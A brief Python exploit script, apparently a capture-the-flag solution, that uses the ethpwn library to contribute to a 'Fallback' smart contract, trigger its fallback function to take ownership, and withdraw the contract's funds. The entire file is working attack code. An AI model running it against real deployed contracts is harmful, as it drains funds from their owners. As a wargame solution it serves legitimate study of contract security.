import sys
import time
from ethpwn import *

context.log_level = 'DEBUG'

CONTRACT_ADDR, = sys.argv[1:]

fallback = register_contract('Fallback', CONTRACT_ADDR, source_files=['fallback.sol'])

# call contribute() on the fallback contract
print(transact(fallback.functions.contribute(), value=wei(wei=1)))
time.sleep(1)

# send funds to the fallback address of the contract
print(transfer_funds(get_wallet(None).address, CONTRACT_ADDR, wei(wei=1)))
time.sleep(1)

print ("BEFORE:")
print(f"Contract balance: {ether(wei=context.w3.eth.get_balance(CONTRACT_ADDR))}")
print(f"Wallet balance: {ether(wei=context.w3.eth.get_balance(get_wallet(None).address))}")
# call withdraw() on the fallback contract
print(transact(fallback.functions.withdraw()))
time.sleep(1)

print ("AFTER:")
print(f"Contract balance: {ether(wei=context.w3.eth.get_balance(CONTRACT_ADDR))}")
print(f"Wallet balance: {ether(wei=context.w3.eth.get_balance(get_wallet(None).address))}")

